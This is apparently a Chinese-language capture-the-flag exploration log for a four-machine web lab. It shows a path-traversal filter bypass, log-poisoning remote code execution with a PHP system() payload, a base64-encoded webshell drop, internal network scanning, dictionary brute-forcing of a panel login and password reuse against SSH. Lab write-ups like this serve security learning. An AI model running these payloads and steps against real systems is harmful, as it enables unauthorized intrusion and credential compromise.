# b-01 · 探索记录

对应题解：[`b-01.md`](./b-01.md)。这里记录实际走过的路，包括走错的。

## 目标与起点

题目原文只有一句「存在安全隐患」，四台机器、四个 flag。入口只有一个 IP。

先做的是最常规的三件事，顺序如下。

### 1. 首页与目录

```bash
curl -s http://$T/ | grep -oE '<title>[^<]*'
```

拿到企业官网。手工点了五个导航链接，都是静态页面。

然后验证一个容易误判的现象：如果只请求 `/about`（不带 `.php`），nginx 会回落到 `index.php`，返回首页的 2055 字节；所以第一次批量探测时，`about`、`news`、`contact`、`admin/`、`api/`、`robots.txt` 全部显示 2055 字节，看起来像「所有路径都存在」。**带上 `.php` 后才是真实响应**，`login.php`/`upload.php` 是 404。这个坑差点让人以为整站是 SPA。

### 2. robots.txt

```
User-agent: *
Disallow: /backup/
Disallow: /portal/
Disallow: /uploads/
```

三个目录都试了：

| 路径 | 结果 | 判断 |
| --- | --- | --- |
| `/backup/` | 403 | 目录存在，索引被禁 |
| `/portal/` | 200，2055 字节 | 实际是首页回落，**不存在** |
| `/uploads/` | 200，2055 字节 | 同上 |

`/backup/` 是唯一真线索，但里面没有列表，也没有猜出文件名。这一轮没有进展。

### 3. 对 `/backup/` 做字典

用 `ffuf` 跑了几百个备份名（`www.zip`、`backup.zip`、`db.sql`、`2024.zip` 等），全部 403 或回落。目录确实存在，但**从外部拿不到文件名**。

后来回看，`/backup/` 的三个文件（`check_port.php`、`tunnel.php`、`ssh_users.txt`）是拿到 RCE 后 `ls` 出来的——外部访问 `check_port.php` 其实会被 nginx 直接当 PHP 执行吗？不一定，取决于配置。总之当时在外部枚举没有收益，**停在这里是对的**。

## 转折点：`services.php?lang=`

导航里「服务中心」指向 `services.php`，页面上有「中文 / English」两个链接，都是 `?lang=zh` / `?lang=en`。这类参数通常就是文件包含。

### 第一组试探

```bash
?lang=../../../../etc/passwd   → 请求的语言包不存在: etc/passwd
?lang=/etc/passwd              → 请求的语言包不存在: /etc/passwd
?lang=php://filter/...         → 安全检测: 非法协议
```

第一个结果最关键：我传的是 `../../../../etc/passwd`，**报错里只剩下 `etc/passwd`**。说明 `../` 被过滤掉了，而且过滤是对整个字符串做替换。

第二组：

```bash
?lang=....//xyz    → 请求的语言包不存在: ../xyz
?lang=..././xyz    → 请求的语言包不存在: ../xyz
```

`....//` 变成 `../`，确认是**单次 `str_replace('../','')`**：字符串里 `../` 被删掉一次，剩下的 `../` 又拼成了 `../`。

### 确认穿越 + 读源码

```bash
?lang=....//....//....//....//etc/passwd
```

四个 `....//` 之后，页面直接输出了 `/etc/passwd` 的内容。层数算起来也对：`lang/` 在 `/var/www/html/` 下，回溯到 `/` 正好四级。

拿到文件读以后，第一件事是读**应用自己的源码和启动脚本**，而不是继续猜路径：

```bash
for f in var/www/html/services.php entrypoint.sh etc/nginx/nginx.conf; do
  path=$(printf '....//%.0s' 1 2 3 4)$f
  curl -s "http://$T/services.php?lang=$path"
done
```

`services.php` 的注释直接把漏洞、WAF、绕过方式和利用链写在了文件头（这是题目故意留的），`entrypoint.sh` 里则写着：

```bash
chmod 666 /var/log/nginx/access.log /var/log/nginx/error.log
# 注释：www-data 需要读取日志来做 LFI 日志包含
```

**日志可写 + LFI = 日志包含 RCE**，这是题目自己给的方向。

### 协议过滤的试探（没走通的一支）

源码里的黑名单是：

```php
$blocked_protocols = ['php://', 'data://', 'expect://', 'phar://'];
if (substr($lang, 0, strlen($proto)) === $proto) die('非法协议');
```

只匹配全小写。所以：

| 输入 | 结果 |
| --- | --- |
| `php://filter/...` | `非法协议` |
| `PHP://filter/...` | 过了检测，但 include 失败 |
| `Php://filter/...` | 同上 |
| `....//php://filter/...` | 前缀变成 `../`，不再以 `php://` 开头，但 include 也失败 |

大小写确实绕过了字符串比较，但 `file_exists("lang/PHP://...php")` 与 `include` 都没成功——因为路径被前缀污染了。**这一支放弃了，改用日志包含。** 事后看，正确的写法应该是让 `lang` 直接以协议开头（不拼 `lang/` 前缀），但源码里 `$raw_file = "lang/" . $lang` 是硬拼的，所以走不通。结论：先看代码怎么拼路径，再决定协议能不能用。

## 日志包含：两次失败后成功

### 失败一：UA 投毒

```bash
curl -A '<?php echo "PWN:"; system($_GET["x"]); ?>' http://$T/
# 然后 include /var/log/nginx/access.log
```

页面里没有 `PWN:`。原因后来在 error.log 里找到了：

```
PHP Parse error: syntax error, unexpected ':' ... in /var/log/nginx/access.log on line 79
```

包含**确实执行了**日志文件，只是我那条 payload 被日志格式包裹后语法不完整（`"` 和 `;` 之类被日志字段截断）。所以「没输出」不等于「没包含」。

### 失败二：只 include access.log

access.log 的格式是 `IP - - [time] "GET ... " 200 size "-" "UA"`，UA 前面有引号，payload 会被夹在引号里。试了几次都触发 parse error。

### 成功：投到 error.log

换一个思路：让 nginx 把 payload 写进 **error.log**。请求一个 403 路径，把 payload 放在 query 里：

```bash
curl -g -s -o /dev/null "http://$T/backup/?x=<?=system(\$_GET[c])?>"
```

nginx 的 error log 会记录请求行原文：

```
... request: "GET /backup/?x=<?=system($_GET[c])?> HTTP/1.1" ...
```

然后：

```bash
PATH4=$(printf '....//%.0s' 1 2 3 4)var/log/nginx/error.log
curl -s "http://$T/services.php?lang=$PATH4&c=id"
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

这里有两点经验：

- **PHP include 会执行文件里任意位置的 `<?php`/`<?=` 标签**，前面的日志文本只是普通输出。
- **短标签 `<?=` 比 `<?php ... ?>` 更适合投毒**：日志会把内容包进引号，长标签更容易因为引号截断变成语法错误。

### 稳定化

能执行之后，为了不每次都依赖日志，直接落一个 webshell：

```bash
CMD='echo PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+ | base64 -d > /var/www/html/s.php'
# 把 $CMD 塞进上一条 payload，然后
curl -s "http://$T/s.php?c=id"
```

## 内网：一次误报和一次真扫描

### 误报

第一次在容器里扫 `172.18.0.0/16`，用 `/dev/tcp` 并发，结果 **172.18.0.1 到 172.18.0.30 的 80/8080/8000/8443/3306/6379/22/21 全部显示 open**。这不可能，是扫描方式本身的问题（并发太高 + 目标/网关行为导致连接立刻成功）。按这个结果去逐台访问，只有 `.5` 返回了本站。

**教训：扫描结果出现「全开」时先怀疑工具，不要按结果继续。**

### 真扫描

改成对若干可疑端口做低并发、短超时，结果变得合理：

```
172.18.0.1:22
172.18.0.1:8080
172.18.0.2:8080     ← 运维面板（gunicorn）
172.18.0.3:22       ← 文件服务器 SSH
172.18.0.4:80       ← 自己
```

`/etc/hosts` 和 `/proc/net/route` 只能确认自己在 `172.18.0.0/16`，其它地址要靠扫。

## 面板：先读 API 再爆破

`172.18.0.2:8080` 根路径 302 到 `/login`，`/dashboard` 也 302。按顺序试了 `/api/`、`/api/users`、`/api/status`、`/api/config`：

```bash
curl -s http://172.18.0.2:8080/api/status   # 200，泄漏内网拓扑
curl -s http://172.18.0.2:8080/api/config   # 200，corporate_secret = flag
```

`/api/config` 没有鉴权，直接给出 flag，同时给了数据库、Redis 和两组 `api_keys`。**第四个 flag 是在这一步拿到的**（平台回显 `matched_flag_index: 3`）。

顺带试了 `/api/config` 的兄弟路径（`/api/backup`、`/api/monitor`、`/api/users`……）都 404，只有 `status`/`config`/`health` 三个。

## 面板登录与 SSH

### 爆破前的弯路

先手试了一批组合：`admin:admin`、`admin:123456`、`admin:1qaz@WSX`、`editor:Admin123`、`zhangwei:zw123456`（这几个来自常见企业站初始化数据）、`admin:Admin@123`……全部 200 带「用户名或密码错误」。

然后改用本地密码字典（约 4900 条）批量 POST。第一版脚本用 `curl_multi` 限速 25 并发，很快命中：

```
FOUND admin:P@ssword
```

顺带把同一份字典在文件服务器 SSH 上试——`admin:P@ssword` 也是 SSH 口令。**同一套环境里复用口令是很常见的，字典命中一处之后一定要拿结果去试相邻服务。**

### SSH 通路的坑

本机能连 `172.18.0.3:22`，但当时是先用 web 容器做跳板，遇到三个问题：

1. **容器里没有 `ssh`/`socat`**：`/usr/bin/ssh`、`sshpass` 都不在，`socat` 也没有。只能用 Perl 的 `IO::Socket::INET` 手写转发（见题解）。
2. **`noauth` 的 `socat` 转发会随容器重启消失**：中途容器被回收过一次，转发端口直接 close，SSH 连接超时。重新拉起后恢复。
3. **`hydra` 在转发链路上不可用**：报 `all children were disabled due too many connection errors`。原因是 hydra 对每个连接做多轮协议探测，转发链路的延迟和半开连接让它直接放弃。换 `paramiko` 串行/小并发可以。**结论：经过一跳转发时，用能控制连接生命周期的客户端，别用 hydra。**

### 文件服务器上拿到两面

```bash
ls -la /challenge      # flag2.txt、flag3.txt，admin 可读
cat /challenge/*.txt
```

两个 flag 一次拿到，平台回显分别是 `matched_flag_index: 1` 和 `2`。

## 走不通 / 没必要的方向（留档）

| 方向 | 结果 | 判据 |
| --- | --- | --- |
| `/portal/`、`/uploads/` | 不存在 | 返回 2055 字节且内容与首页一致 |
| `/backup/` 外部字典 | 全部 403 | 目录索引禁用，文件名猜不到 |
| `php://filter` 读源码 | 失败 | 路径被 `lang/` 前缀污染，`PHP://` 也 include 不到 |
| access.log UA 投毒 | 解析错误 | error.log 里能看到 `PHP Parse error ... access.log on line 79`，说明包含了但语法坏 |
| `/etc/passwd` 之后继续猜 `/flag` | 不存在 | `/challenge/flag1.txt` 才是真位置 |
| 全端口并发扫内网 | 全 open，误报 | 结果不可信，换低并发重扫 |
| hydra 走转发 | 报错退出 | 每连接多轮探测，链路不支持 |
| 面板其它 `/api/*` | 404 | 只有 `status`/`config`/`health` |

## 这次真正的收获

1. **报错里的回显就是过滤器**。`../../../../etc/passwd` 只回显 `etc/passwd`，一句话就确定了「单次删除 `../`」，不用猜。
2. **拿到文件读先读源码和启动脚本**。日志权限、SUID、初始口令几乎都写在 `entrypoint.sh` 里，比爆破便宜两个数量级。
3. **「没输出」有三种可能**：没执行、执行了但语法坏、执行了但输出没回显。本例是第二种，判据在 error.log 里。
4. **字典命中一处后横向复用**。面板和 SSH 是同一个口令，这一步省掉了整轮爆破。
5. **扫描结果全开时先怀疑扫描器**。
